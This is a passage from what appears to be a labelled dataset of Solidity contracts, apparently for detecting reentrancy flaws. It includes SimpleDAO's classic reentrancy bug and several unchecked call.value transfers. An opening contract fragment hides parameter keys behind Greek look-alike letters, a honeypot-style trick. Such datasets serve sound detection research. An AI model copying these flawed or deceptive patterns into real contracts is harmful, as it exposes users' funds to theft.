* (now - users[uid].hodling_since) / 1 days; reward = parameters[\"max_reward\"]; } function is_passcode_correct(uint uid, bytes32 passcode) public constant returns(bool passcode_correct){ require(uid < users.length); bytes32 passcode_actually = users[uid].passcode; if (passcode_actually & 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF == 0){ return passcode == passcode_actually; } else { return keccak256(passcode) == passcode_actually; } } function claim_reward(uint uid, bytes32 passcode) public payable{ require(msg.value >= parameters[\"price\"]); require(is_passcode_correct(uid, passcode)); uint final_reward = get_reward(uid) + msg.value; if (final_reward > parameters[\"price_po\u03bfl\"]) final_reward = parameters[\"price_po\u03bfl\"]; require(msg.sender.call.value(final_reward)()); parameters[\"price_po\u03bfl\"] -= final_reward; if (uid + 1 < users.length) users[uid] = users[users.length - 1]; users.length -= 1; } function refund_and_die() public{ require(msg.sender == address(parameters['owner'])); require(parameters[\"last_h\u03bfdler\"] + 7 days < now); uint price_pool_remaining = parameters[\"price_p\u03bf\u03bfl\"]; for(uint i=0; i<users.length && price_pool_remaining > 0; ++i){ uint reward = get_reward(i); if (reward > price_pool_remaining) reward = price_pool_remaining; if (users[i].hodler.send(reward)) price_pool_remaining -= reward; } selfdestruct(msg.sender); } function check_parameters_sanity() internal view{ require(parameters['price'] <= 1 ether); require(parameters['base_reward'] >= parameters['price'] / 2); require(parameters[\"daily_reward\"] >= parameters['base_reward'] / 2); require(parameters['max_reward'] >= parameters['price']); } function set_parameter(string name, uint value) public{ require(msg.sender == address(parameters['owner'])); require(keccak256(name) != keccak256(\"last_hodler\")); require(keccak256(name) != keccak256(\"price_pool\")); parameters[name] = value; check_parameters_sanity(); } function () public payable { parameters[\"price_pool\"] += msg.value; } } "}
{"sol name": "SimpleDAO.sol", "label": 1, "first path": "function withdraw(uint amount) { if (credit[msg.sender]>= amount) { msg.sender.call.value(amount)(); credit[msg.sender]-=amount; ", "second path": "function withdraw(uint amount) { if (credit[msg.sender]>= amount) { msg.sender.call.value(amount)(); credit[msg.sender]-=amount; ", "third path": "function withdraw(uint amount) { if (credit[msg.sender]>= amount) { msg.sender.call.value(amount)(); credit[msg.sender]-=amount; ", "long path": "contract SimpleDAO { mapping (address => uint) public credit; function donate(address to) { credit[to] += msg.value; } function withdraw(uint amount) { if (credit[msg.sender]>= amount) { msg.sender.call.value(amount)(); credit[msg.sender]-=amount; } } function queryCredit(address to) returns (uint){ return credit[to]; } } "}
{"sol name": "21241.sol", "label": 0, "first path": "function finish() onlyOwner saleCompletedSuccessfully public { uint256 freeEthers = address(this).balance * 40 / 100; uint256 vestedEthers = address(this).balance - freeEthers; address(0xd1B10607921C78D9a00529294C4b99f1bd250E1c).transfer(freeEthers); assert(address(0x0285d35508e1A1f833142EB5211adb858Bd3323A).call.value(vestedEthers)()); AuctusToken token = AuctusToken(auctusTokenAddress); token.setTokenSaleFinished(); if (remainingTokens > 0) { token.burn(remainingTokens); remainingTokens = 0; ", "second path": "function finish() onlyOwner saleCompletedSuccessfully public { uint256 freeEthers = address(this).balance * 40 / 100; uint256 vestedEthers = address(this).balance - freeEthers; address(0xd1B10607921C78D9a00529294C4b99f1bd250E1c).transfer(freeEthers); assert(address(0x0285d35508e1A1f833142EB5211adb858Bd3323A).call.value(vestedEthers)()); AuctusToken token = AuctusToken(auctusTokenAddress); token.setTokenSaleFinished(); if (remainingTokens > 0) { token.burn(remainingTokens); remainingTokens = 0; ", "third path": "function finish() onlyOwner saleCompletedSuccessfully public { uint256 freeEthers = address(this).balance * 40 / 100; uint256 vestedEthers = address(this).balance - freeEthers; address(0xd1B10607921C78D9a00529294C4b99f1bd250E1c).transfer(freeEthers); assert(address(0x0285d35508e1A1f833142EB5211adb858Bd3323A).call.value(vestedEthers)()); AuctusToken token = AuctusToken(auctusTokenAddress); token.setTokenSaleFinished(); if (remainingTokens > 0) { token.burn(remainingTokens); remainingTokens = 0; ", "long path": "pragma solidity ^0.4.21; library SafeMath { function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(a <= c); return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(a >= b); return a - b; } function mul(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a * b; assert(a == 0 || c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return a / b; } } contract ContractReceiver { function tokenFallback(address from, uint256 value, bytes data) public; } contract AuctusToken { function transfer(address to, uint256 value) public returns (bool); function transfer(address to, uint256 value, bytes data) public returns (bool); function burn(uint256 value) public returns (bool); function setTokenSaleFinished() public; } contract AuctusWhitelist { function getAllowedAmountToContribute(address addr) view public returns(uint256); } contract AuctusTokenSale is ContractReceiver { using SafeMath for uint256; address public auctusTokenAddress = 0xfD89de68b246eB3e21B06e9B65450AC28D222488; address public auctusWhiteListAddress = 0xA6e728E524c1D7A65fE5193cA1636265DE9Bc982; uint256 public startTime = 1522159200; uint256 public endTime; uint256 public basicPricePerEth = 2000; address public owner; uint256 public softCap; uint256 public remainingTokens; uint256 public weiRaised; mapping(address => uint256) public invested; bool public saleWasSet; bool public tokenSaleHalted; event Buy(address indexed buyer, uint256 tokenAmount); event Revoke(address indexed buyer, uint256 investedAmount); function AuctusTokenSale(uint256 minimumCap, uint256 endSaleTime) public { owner = msg.sender; softCap = minimumCap; endTime = endSaleTime; saleWasSet = false; tokenSaleHalted = false; } modifier onlyOwner() { require(owner == msg.sender); _; } modifier openSale() { require(saleWasSet && !tokenSaleHalted && now >= startTime && now <= endTime && remainingTokens > 0); _; } modifier saleCompletedSuccessfully() { require(weiRaised >= softCap && (now > endTime || remainingTokens == 0)); _; } modifier saleFailed() { require(weiRaised < softCap && now > endTime); _; } function transferOwnership(address newOwner) onlyOwner public { require(newOwner != address(0)); owner = newOwner; } function setTokenSaleHalt(bool halted) onlyOwner public { tokenSaleHalted = halted; } function setSoftCap(uint256 minimumCap) onlyOwner public { require(now < startTime); softCap = minimumCap; } function setEndSaleTime(uint256 endSaleTime) onlyOwner public { require(now < endTime); endTime = endSaleTime; } function tokenFallback(address, uint256 value, bytes) public { require(msg.sender == auctusTokenAddress); require(!saleWasSet); setTokenSaleDistribution(value); } function() payable openSale public { uint256 weiToInvest; uint256 weiRemaining; (weiToInvest, weiRemaining) = getValueToInvest(); require(weiToInvest > 0); uint256 tokensToReceive = weiToInvest.mul(basicPricePerEth); remainingTokens = remainingTokens.sub(tokensToReceive); weiRaised = weiRaised.add(weiToInvest); invested[msg.sender] = invested[msg.sender].add(weiToInvest); if (weiRemaining > 0) { msg.sender.transfer(weiRemaining); } assert(AuctusToken(auctusTokenAddress).transfer(msg.sender, tokensToReceive)); emit Buy(msg.sender, tokensToReceive); } function revoke() saleFailed public { uint256 investedValue = invested[msg.sender]; require(investedValue > 0); invested[msg.sender] = 0; msg.sender.transfer(investedValue); emit Revoke(msg.sender, investedValue); } function finish() onlyOwner saleCompletedSuccessfully public { uint256 freeEthers = address(this).balance * 40 / 100; uint256 vestedEthers = address(this).balance - freeEthers; address(0xd1B10607921C78D9a00529294C4b99f1bd250E1c).transfer(freeEthers); assert(address(0x0285d35508e1A1f833142EB5211adb858Bd3323A).call.value(vestedEthers)()); AuctusToken token = AuctusToken(auctusTokenAddress); token.setTokenSaleFinished(); if (remainingTokens > 0) { token.burn(remainingTokens); remainingTokens = 0; } } function getValueToInvest() view private returns (uint256, uint256) { uint256 allowedValue = AuctusWhitelist(auctusWhiteListAddress).getAllowedAmountToContribute(msg.sender); uint256 weiToInvest; if (allowedValue == 0) { weiToInvest = 0; } else if (allowedValue >= invested[msg.sender].add(msg.value)) { weiToInvest = getAllowedAmount(msg.value); } else { weiToInvest = getAllowedAmount(allowedValue.sub(invested[msg.sender])); } return (weiToInvest, msg.value.sub(weiToInvest)); } function getAllowedAmount(uint256 value) view private returns (uint256) { uint256 maximumValue = remainingTokens / basicPricePerEth; if (value > maximumValue) { return maximumValue; } else { return value; } } function setTokenSaleDistribution(uint256 totalAmount) private { uint256 auctusCoreTeam = totalAmount * 20 / 100; uint256 bounty = totalAmount * 2 / 100; uint256 reserveForFuture = totalAmount * 18 / 100; uint256 partnershipsAdvisoryFree = totalAmount * 18 / 1000; uint256 partnershipsAdvisoryVested = totalAmount * 72 / 1000; uint256 privateSales = 2970000000000000000000000; uint256 preSale = 2397307557007329968290000; transferTokens(auctusCoreTeam, bounty, reserveForFuture, preSale, partnershipsAdvisoryVested, partnershipsAdvisoryFree, privateSales); remainingTokens = totalAmount - auctusCoreTeam - bounty - reserveForFuture - preSale - partnershipsAdvisoryVested - partnershipsAdvisoryFree - privateSales; saleWasSet = true; } function transferTokens( uint256 auctusCoreTeam, uint256 bounty, uint256 reserveForFuture, uint256 preSale, uint256 partnershipsAdvisoryVested, uint256 partnershipsAdvisoryFree, uint256 privateSales ) private { AuctusToken token = AuctusToken(auctusTokenAddress); bytes memory empty; assert(token.transfer(0x6bc58c572d0973cF0EfA1Fe1D7D6c9d7Eea2cd23, auctusCoreTeam, empty)); assert(token.transfer(0x936Cf3e904B83B1D939C41475DC5F7c470419A3E, bounty, empty)); assert(token.transfer(0xF5ad5fF703D0AD0df3bAb3A1194FbCC5c152bf3b, reserveForFuture, empty)); assert(token.transfer(0x2cE4FAb9F313F1df0978869C5d302768F1bB471d, preSale, empty)); assert(token.transfer(0x03f6278E5c359a5E8947a62E87D85AC394580d13, partnershipsAdvisoryVested, empty)); assert(token.transfer(0x6c89Cc03036193d52e9b8386413b545184BDAb99, partnershipsAdvisoryFree)); assert(token.transfer(0xd1B10607921C78D9a00529294C4b99f1bd250E1c, privateSales)); } } "}
{"sol name": "39817.sol", "label": 0, "first path": "function callDividend(address token_) owned { assert(tokenManage[token_].hasDividend); assert(tokenManage[token_].divContractAddress.call.value(0)(tokenManage[token_].divData)); function buyEther(uint256 amount) { assert(valueToToken(etherContract,balances[msg.sender]) >= amount); assert(destroyValue(msg.sender, tokenToValue(etherContract,amount))); assert(msg.sender.call.value(amount)()); Buy(etherContract, msg.sender, amount, balances[msg.sender]); function quickTrade(address tokenFrom, address tokenTo, uint256 input) payable drainBlock { uint256 inValue; uint256 tempInValue = safeAdd(tokenToValue(etherContract,msg.value), tokenToValue(tokenFrom,input)); inValue = valueWithFee(tempInValue); uint256 outValue = valueToToken(tokenTo,inValue); assert(verifiedTransferFrom(tokenFrom,msg.sender,input)); if (tokenTo == etherContract){ assert(msg.sender.call.value(outValue)()); } else assert(Token(tokenTo).transfer(msg.sender, outValue)); Trade(tokenFrom, tokenTo, msg.sender, inValue); function takeEtherProfits(){ ShopKeeper(shopKeeperLocation).splitProfits(); ValueTrader shop = ValueTrader(shopLocation); shop.buyEther(shop.balanceOf(this)); assert(profitContainerLocation.call.value(this.balance)()); ", "second path": "function callDividend(address token_) owned { assert(tokenManage[token_].hasDividend); assert(tokenManage[token_].divContractAddress.call.value(0)(tokenManage[token_].divData)); function buyEther(uint256 amount) { assert(valueToToken(etherContract,balances[msg.sender]) >= amount); assert(destroyValue(msg.sender, tokenToValue(etherContract,amount))); assert(msg.sender.call.value(amount)()); Buy(etherContract, msg.sender, amount, balances[msg.sender]); function quickTrade(address tokenFrom, address tokenTo, uint256 input) payable drainBlock { uint256 inValue; uint256 tempInValue = safeAdd(tokenToValue(etherContract,msg.value), tokenToValue(tokenFrom,input)); inValue = valueWithFee(tempInValue); uint256 outValue = valueToToken(tokenTo,inValue); assert(verifiedTransferFrom(tokenFrom,msg.sender,input)); if (tokenTo == etherContract){ assert(msg.sender.call.value(outValue)()); } else assert(Token(tokenTo).transfer(msg.sender, outValue)); Trade(tokenFrom, tokenTo, msg.sender, inValue); function takeEtherProfits(){ ShopKeeper(shopKeeperLocation).splitProfits(); ValueTrader shop = ValueTrader(shopLocation); shop.buyEther(shop.balanceOf(this)); assert(profitContainerLocation.call.value(this.balance)()); ", "third path": "function callDividend(address token_) owned { assert(tokenManage[token_].hasDividend); assert(tokenManage[token_].divContractAddress.call.value(0)(tokenManage[token_].divData)); function buyEther(uint256 amount) { assert(valueToToken(etherContract,balances[msg.sender]) >= amount); assert(destroyValue(msg.sender, tokenToValue(etherContract,amount))); assert(msg.sender.call.value(amount)()); Buy(etherContract, msg.sender, amount, balances[msg.sender]); function quickTrade(address tokenFrom, address tokenTo, uint256 input) payable drainBlock { uint256 inValue; uint256 tempInValue = safeAdd(tokenToValue(etherContract,msg.value), tokenToValue(tokenFrom,input)); inValue = valueWithFee(tempInValue); uint256 outValue = valueToToken(tokenTo,inValue); assert(verifiedTransferFrom(tokenFrom,msg.sender,input)); if (tokenTo == etherContract){ assert(msg.sender.call.value(outValue)()); } else assert(Token(tokenTo).transfer(msg.sender, outValue)); Trade(tokenFrom, tokenTo, msg.sender, inValue); function takeEtherProfits(){ ShopKeeper(shopKeeperLocation).splitProfits(); ValueTrader shop = ValueTrader(shopLocation); shop.buyEther(shop.balanceOf(this)); assert(profitContainerLocation.call.value(this.balance)()); ", "long path": "pragma solidity ^0.4.0; contract SafeMath { function safeMul(uint256 a, uint256 b) internal returns (uint256 c) { c = a * b; assert(a == 0 || c / a == b); } function safeSub(uint256 a, uint256 b) internal returns (uint256 c) { assert(b <= a); c = a - b; } function safeAdd(uint256 a, uint256 b) internal returns (uint256 c) { c = a + b; assert(c>=a && c>=b); } function assert(bool assertion) internal { if (!assertion) throw; } } contract Token { function totalSupply() constant returns (uint256 supply) {} function balanceOf(address _owner) constant returns (uint256 balance) {} function transfer(address _to, uint256 _value) returns (bool success) {} function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {} function approve(address _spender, uint256 _value) returns (bool success) {} function allowance(address _owner, address _spender) constant returns (uint256 remaining) {} event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); uint public decimals; string public name; } contract ValueToken is SafeMath,Token{ string name = \"Value\"; uint decimals = 0; uint256 supplyNow = 0; mapping (address => uint256) internal balances; mapping (address => mapping (address => uint256)) allowed; function totalSupply() constant returns (uint256 totalSupply){ return supplyNow; } function balanceOf(address _owner) constant returns (uint256 balance){ return balances[_owner]; } function transfer(address _to, uint256 _value) returns (bool success){ if (balanceOf(msg.sender) >= _value) { balances[msg.sender] = safeSub(balanceOf(msg.sender), _value); balances[_to] = safeAdd(balanceOf(_to), _value); Transfer(msg.sender, _to, _value); return true; } else { return false; } } function transferFrom(address _from, address _to, uint256 _value) returns (bool success){ if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value) { balances[_to] = safeAdd(balanceOf(_to), _value); balances[_from] = safeSub(balanceOf(_from), _value); allowed[_from][msg.sender] = safeSub(allowed[_from][msg.sender], _value); Transfer(_from, _to, _value); return true; } else { return false; } } function approve(address _spender, uint256 _value) returns (bool success){ if(balances[msg.sender] >= _value){ allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } else { return false; } } function allowance(address _owner, address _spender) constant returns (uint256 remaining){ return allowed[_owner][_spender]; } function createValue(address _owner, uint256 _value) internal returns (bool success){ balances[_owner] = safeAdd(balances[_owner], _value); supplyNow = safeAdd(supplyNow, _value); Mint(_owner, _value); } function destroyValue(address _owner, uint256 _value) internal returns (bool success){ balances[_owner] = safeSub(balances[_owner], _value); supplyNow = safeSub(supplyNow, _value); Burn(_owner, _value); } event Mint(address indexed _owner, uint256 _value); event Burn(address indexed _owner, uint256 _value); } contract ValueTrader is SafeMath,ValueToken{ function () payable { } struct TokenData { bool isValid; uint256 basePrice; uint256 baseLiquidity; uint256 priceScaleFactor; bool hasDividend; address divContractAddress; bytes divData; } address owner; address etherContract; uint256 tradeCoefficient; mapping (address => TokenData) tokenManage; bool public burning = false; bool public draining = false; modifier owned(){ assert(msg.sender == owner); _; } modifier burnBlock(){ assert(!burning); _; } modifier drainBlock(){ assert(!draining); _; } function toggleDrain() burnBlock owned { draining = !draining; } function toggleBurn() owned { assert(draining); assert(balanceOf(owner) == supplyNow); burning = !burning; } function die() owned burnBlock{ selfdestruct(owner); } function validateToken(address token_, uint256 bP_, uint256 bL_, uint256 pF_) owned { tokenManage[token_].isValid = true; tokenManage[token_].basePrice = bP_; tokenManage[token_].baseLiquidity = bL_; tokenManage[token_].priceScaleFactor = pF_; } function configureTokenDividend(address token_, bool hD_, address dA_, bytes dD_) owned { tokenManage[token_].hasDividend = hD_; tokenManage[token_].divContractAddress = dA_; tokenManage[token_].divData = dD_; } function callDividend(address token_) owned { assert(tokenManage[token_].hasDividend); assert(tokenManage[token_].divContractAddress.call.value(0)(tokenManage[token_].divData)); } function invalidateToken(address token_) owned { tokenManage[token_].isValid = false; } function changeOwner(address owner_) owned { owner = owner_; } function changeFee(uint256 tradeFee) owned { tradeCoefficient = tradeFee; } function changeEtherContract(address eC) owned { etherContract = eC; } event Buy(address tokenAddress, address buyer, uint256 amount, uint256 remaining); event Sell(address tokenAddress, address buyer, uint256 amount, uint256 remaining); event Trade(address fromTokAddress, address toTokAddress, address buyer, uint256 amount); function ValueTrader(){ owner = msg.sender; burning = false; draining = false; } function valueWithFee(uint256 tempValue) internal returns (uint256 doneValue){ doneValue = safeMul(tempValue,tradeCoefficient)/10000; if(tradeCoefficient < 10000){ createValue(owner,safeSub(tempValue,doneValue)); } } function currentPrice(address token) constant returns (uint256 price){ if(draining){ price = 1; } else { assert(tokenManage[token].isValid); uint256 basePrice = tokenManage[token].basePrice; uint256 baseLiquidity = tokenManage[token].baseLiquidity; uint256 priceScaleFactor = tokenManage[token].priceScaleFactor; uint256 currentLiquidity; if(token == etherContract){ currentLiquidity = this.balance; }else{ currentLiquidity = Token(token).balanceOf(this); } price = safeAdd(basePrice,safeMul(priceScaleFactor,baseLiquidity/currentLiquidity)); } } function currentLiquidity(address token) constant returns (uint256 liquidity){ liquidity = Token(token).balanceOf(this); } function valueToToken(address token, uint256 amount) constant internal returns (uint256 value){ value = amount/currentPrice(token); assert(value != 0); } function tokenToValue(address token, uint256 amount) constant internal returns (uint256 value){ value = safeMul(amount,currentPrice(token)); } function sellToken(address token, uint256 amount) drainBlock { assert(verifiedTransferFrom(token,msg.sender,amount)); assert(createValue(msg.sender, tokenToValue(token,amount))); Sell(token, msg.sender, amount, balances[msg.sender]); } function buyToken(address token, uint256 amount) { assert(!(valueToToken(token,balances[msg.sender]) < amount)); assert(destroyValue(msg.sender, tokenToValue(token,amount))); assert(Token(token).transfer(msg.sender, amount)); Buy(token, msg.sender, amount, balances[msg.sender]); } function sellEther() payable drainBlock { assert(createValue(msg.sender, tokenToValue(etherContract,msg.value))); Sell(etherContract, msg.sender, msg.value, balances[msg.sender]); } function buyEther(uint256 amount) { assert(valueToToken(etherContract,balances[msg.sender]) >= amount); assert(destroyValue(msg.sender, tokenToValue(etherContract,amount))); assert(msg.sender.call.value(amount)()); Buy(etherContract, msg.sender, amount, balances[msg.sender]); } function quickTrade(address tokenFrom, address tokenTo, uint256 input) payable drainBlock { uint256 inValue; uint256 tempInValue = safeAdd(tokenToValue(etherContract,msg.value), tokenToValue(tokenFrom,input)); inValue = valueWithFee(tempInValue); uint256 outValue = valueToToken(tokenTo,inValue); assert(verifiedTransferFrom(tokenFrom,msg.sender,input)); if (tokenTo == etherContract){ assert(msg.sender.call.value(outValue)()); } else assert(Token(tokenTo).transfer(msg.sender, outValue)); Trade(tokenFrom, tokenTo, msg.sender, inValue); } function verifiedTransferFrom(address tokenFrom, address senderAdd, uint256 amount) internal returns (bool success){ uint256 balanceBefore = Token(tokenFrom).balanceOf(this); success = Token(tokenFrom).transferFrom(senderAdd, this, amount); uint256 balanceAfter = Token(tokenFrom).balanceOf(this); assert((safeSub(balanceAfter,balanceBefore)==amount)); } } contract ShopKeeper is SafeMath{ ValueTrader public shop; address holderA; address holderB; modifier onlyHolders(){ assert(msg.sender == holderA || msg.sender == holderB); _; } modifier onlyA(){ assert(msg.sender == holderA); _; } function(){ throw; } function ShopKeeper(address other){ shop = new ValueTrader(); holderA = msg.sender; holderB = other; } function giveAwayOwnership(address newHolder) onlyHolders { if(msg.sender == holderB){ holderB = newHolder; } else { holderA = newHolder; } } function splitProfits(){ uint256 unprocessedProfit = shop.balanceOf(this); uint256 equalShare = unprocessedProfit/2; assert(shop.transfer(holderA,equalShare)); assert(shop.transfer(holderB,equalShare)); } function toggleDrain() onlyA { shop.toggleDrain(); } function toggleBurn() onlyA { shop.toggleBurn(); } function die() onlyA { shop.die(); } function validateToken(address token_, uint256 bP_, uint256 bL_, uint256 pF_) onlyHolders { shop.validateToken(token_,bP_,bL_,pF_); } function configureTokenDividend(address token_, bool hD_, address dA_, bytes dD_) onlyA { shop.configureTokenDividend(token_,hD_,dA_,dD_); } function callDividend(address token_) onlyA { shop.callDividend(token_); } function invalidateToken(address token_) onlyHolders { shop.invalidateToken(token_); } function changeOwner(address owner_) onlyA { if(holderB == holderA){ shop.changeOwner(owner_); } holderA = owner_; } function changeShop(address newShop) onlyA { if(holderB == holderA){ shop = ValueTrader(newShop); } } function changeFee(uint256 tradeFee) onlyHolders { shop.changeFee(tradeFee); } function changeEtherContract(address eC) onlyHolders { shop.changeEtherContract(eC); } } contract ProfitContainerAdapter is SafeMath{ address owner; address shopLocation; address shopKeeperLocation; address profitContainerLocation; modifier owned(){ assert(msg.sender == owner); _; } function changeShop(address newShop) owned { shopLocation = newShop; } function changeKeeper(address newKeeper) owned { shopKeeperLocation = newKeeper; } function changeContainer(address newContainer) owned { profitContainerLocation = newContainer; } function ProfitContainerAdapter(address sL, address sKL, address pCL){ owner = msg.sender; shopLocation = sL; shopKeeperLocation = sKL; profitContainerLocation = pCL; } function takeEtherProfits(){ ShopKeeper(shopKeeperLocation).splitProfits(); ValueTrader shop = ValueTrader(shopLocation); shop.buyEther(shop.balanceOf(this)); assert(profitContainerLocation.call.value(this.balance)()); } function takeTokenProfits(address token){ ShopKeeper(shopKeeperLocation).splitProfits(); ValueTrader shop = ValueTrader(shopLocation); shop.buyToken(token,shop.balanceOf(this)); assert(Token(token).transfer(profitContainerLocation,Token(token).balanceOf(this))); } function giveAwayHoldership(address holderB) owned { ShopKeeper(shopKeeperLocation).giveAwayOwnership(holderB); } function giveAwayOwnership(address newOwner) owned { owner = newOwner; } } "}
{"sol name": "9920.sol", "label": 0, "first path": "function tryExec(address target, bytes calldata, uint value) internal returns (bool call_ret){ return target.call.value(value)(calldata); function exec(address target, bytes calldata, uint value) internal { if(!tryExec(target, calldata, value)) { throw; function tryExec( address t, bytes c ) internal returns (bool) { return tryExec(t, c, 0); function tryExec( address t, uint256 v ) internal returns (bool) { bytes memory c; return tryExec(t, c, v); contract DSMath { ", "second path": "function tryExec(address target, bytes calldata, uint value) internal returns (bool call_ret){ return target.call.value(value)(calldata); function exec(address target, bytes calldata, uint value) internal { if(!tryExec(target, calldata, value)) { throw; function tryExec( address t, bytes c ) internal returns (bool) { return tryExec(t, c, 0); function tryExec( address t, uint256 v ) internal returns (bool) { bytes memory c; return tryExec(t, c, v); contract DSMath { ", "third path": "function tryExec(address target, bytes calldata, uint value) internal returns (bool call_ret){ return target.call.value(value)(calldata); function exec(address target, bytes calldata, uint value) internal { if(!tryExec(target, calldata, value)) { throw; function tryExec( address t, bytes c ) internal returns (bool) { return tryExec(t, c, 0); function tryExec( address t, uint256 v ) internal returns (bool) { bytes memory c; return tryExec(t, c, v); contract DSMath { ", "long path": "pragma solidity ^0.4.11; contract DSNote { event LogNote( bytes4   indexed  sig, address  indexed  guy, bytes32  indexed  foo, bytes32  indexed  bar, uint           wad, bytes             fax ) anonymous; modifier note { bytes32 foo; bytes32 bar; assembly { foo := calldataload(4) bar := calldataload(36) } LogNote(msg.sig, msg.sender, foo, bar, msg.value, msg.data); _; } } contract ERC20 { function totalSupply() constant returns (uint supply); function balanceOf( address who ) constant returns (uint value); function allowance( address owner, address spender ) constant returns (uint _allowance); function transfer( address to, uint value) returns (bool ok); function transferFrom( address from, address to, uint value) returns (bool ok); function approve( address spender, uint value ) returns (bool ok); event Transfer( address indexed from, address indexed to, uint value); event Approval( address indexed owner, address indexed spender, uint value); } contract DSAuthority { function canCall( address src, address dst, bytes4 sig ) constant returns (bool); } contract DSAuthEvents { event LogSetAuthority (address indexed authority); event LogSetOwner     (address indexed owner); } contract DSAuth is DSAuthEvents { DSAuthority  public  authority; address      public  owner; function DSAuth() { owner = msg.sender; LogSetOwner(msg.sender); } function setOwner(address owner_) auth { owner = owner_; LogSetOwner(owner); } function setAuthority(DSAuthority authority_) auth { authority = authority_; LogSetAuthority(authority); } modifier auth { assert(isAuthorized(msg.sender, msg.sig)); _; } modifier authorized(bytes4 sig) { assert(isAuthorized(msg.sender, sig)); _; } function isAuthorized(address src, bytes4 sig) internal returns (bool) { if (src == address(this)) { return true; } else if (src == owner) { return true; } else if (authority == DSAuthority(0)) { return false; } else { return authority.canCall(src, this, sig); } } function assert(bool x) internal { if (!x) throw; } } contract DSExec { function tryExec(address target, bytes calldata, uint value) internal returns (bool call_ret){ return target.call.value(value)(calldata); } function exec(address target, bytes calldata, uint value) internal { if(!tryExec(target, calldata, value)) { throw; } } function exec( address t, bytes c ) internal { exec(t, c, 0); } function exec( address t, uint256 v ) internal { bytes memory c; exec(t, c, v); } function tryExec( address t, bytes c ) internal returns (bool) { return tryExec(t, c, 0); } function tryExec( address t, uint256 v ) internal returns (bool) { bytes memory c; return tryExec(t, c, v); } } contract DSMath { function add(uint256 x, uint256 y) constant internal returns (uint256 z) { assert((z = x + y) >= x); } function sub(uint256 x, uint256 y) constant internal returns (uint256 z) { assert((z = x - y) <= x); } function mul(uint256 x, uint256 y) constant internal returns (uint256 z) { assert((z = x * y) >= x); } function div(uint256 x, uint256 y) constant internal returns (uint256 z) { z = x / y; } function min(uint256 x, uint256 y) constant internal returns (uint256 z) { return x <= y ? x : y; } function max(uint256 x, uint256 y) constant internal returns (uint256 z) { return x >= y ? x : y; } function hadd(uint128 x, uint128 y) constant internal returns (uint128 z) { assert((z = x + y) >= x); } function hsub(uint128 x, uint128 y) constant internal returns (uint128 z) { assert((z = x - y) <= x); } function hmul(uint128 x, uint128 y) constant internal returns (uint128 z) { assert((z = x * y) >= x); } function hdiv(uint128 x, uint128 y) constant internal returns (uint128 z) { z = x / y; } function hmin(uint128 x, uint128 y) constant internal returns (uint128 z) { return x <= y ? x : y; } function hmax(uint128 x, uint128 y) constant internal returns (uint128 z) { return x >= y ? x : y; } function imin(int256 x, int256 y) constant internal returns (int256 z) { return x <= y ? x : y; } function imax(int256 x, int256 y) constant internal returns (int256 z) { return x >= y ? x : y; } uint128 constant WAD = 10 ** 18; function wadd(uint128 x, uint128 y) constant internal returns (uint128) { return hadd(x, y); } function wsub(uint128 x, uint128 y) constant internal returns (uint128) { return hsub(x, y); } function wmul(uint128 x, uint128 y) constant internal returns (uint128 z) { z = cast((uint256(x) * y + WAD / 2) / WAD); } function wdiv(uint128 x, uint128 y) constant internal returns (uint128 z) { z = cast((uint256(x) * WAD + y / 2) / y); } function wmin(uint128 x, uint128 y) constant internal returns (uint128) { return hmin(x, y); } function wmax(uint128 x, uint128 y) constant internal returns (uint128) { return hmax(x, y); } uint128 constant RAY = 10 ** 27; function radd(uint128 x, uint128 y) constant internal returns (uint128) { return hadd(x, y); } function rsub(uint128 x, uint128 y) constant internal returns (uint128) { return hsub(x, y); } function rmul(uint128 x, uint128 y) constant internal returns (uint128 z) { z = cast((uint256(x) * y + RAY / 2) / RAY); } function rdiv(uint128 x, uint128 y) constant internal returns (uint128 z) { z = cast((uint256(x) * RAY + y / 2) / y); } function rpow(uint128 x, uint64 n) constant internal returns (uint128 z) { z = n % 2 != 0 ? x : RAY; for (n /= 2; n != 0; n /= 2) { x = rmul(x, x); if (n % 2 != 0) { z = rmul(z, x); } } } function rmin(uint128 x, uint128 y) constant internal returns (uint128) { return hmin(x, y); } function rmax(uint128 x, uint128 y) constant internal returns (uint128) { return hmax(x, y); } function cast(uint256 x) constant internal returns (uint128 z) { assert((z = uint128(x)) == x); } } contract DSStop is DSAuth, DSNote { bool public stopped; modifier stoppable { assert (!stopped); _; } function stop() auth note { stopped = true; } function start() auth note { stopped = false; } } contract DSTokenBase is ERC20, DSMath { uint256                                            _supply; mapping (address => uint256)                       _balances; mapping (address => mapping (address => uint256))  _approvals; function DSTokenBase(uint256 supply) { _balances[msg.sender] = supply; _supply = supply; } function totalSupply() constant returns (uint256) { return _supply; } function balanceOf(address src) constant returns (uint256) { return _balances[src]; } function allowance(address src, address guy) constant returns (uint256) { return _approvals[src][guy]; } function transfer(address dst, uint wad) returns (bool) { assert(_balances[msg.sender] >= wad); _balances[msg.sender] = sub(_balances[msg.sender], wad); _balances[dst] = add(_balances[dst], wad); Transfer(msg.sender, dst, wad); return true; } function transferFrom(address src, address dst, uint wad) returns (bool) { assert(_balances[src] >= wad); assert(_approvals[src][msg.sender] >= wad); _approvals[src][msg.sender] = sub(_approvals[src][msg.sender], wad); _balances[src] = sub(_balances[src], wad); _balances[dst] = add(_balances[dst], wad); Transfer(src, dst, wad); return true; } function approve(address guy, uint256 wad) returns (bool) { _approvals[msg.sender][guy] = wad; Approval(msg.sender, guy, wad); return true; } } contract WhiteList { mapping (address => bool)   public  whiteList; address  public  owner; function WhiteList() public { owner = msg.sender; whiteList[owner] = true; } function addToWhiteList(address [] _addresses) public { require(msg.sender == owner); for (uint i = 0; i < _addresses.length; i++) { whiteList[_addresses[i]] = true; } } function removeFromWhiteList(address [] _addresses) public { require (msg.sender == owner); for (uint i = 0; i < _addresses.length; i++) { whiteList[_addresses[i]] = false; } } } contract DSToken is DSTokenBase(0), DSStop { bytes32  public  symbol = \"GENEOS\"; uint256  public  decimals = 18; WhiteList public wlcontract; function DSToken(WhiteList wlc_) { require(msg.sender == wlc_.owner()); wlcontract = wlc_; } function transfer(address dst, uint wad) stoppable note returns (bool) 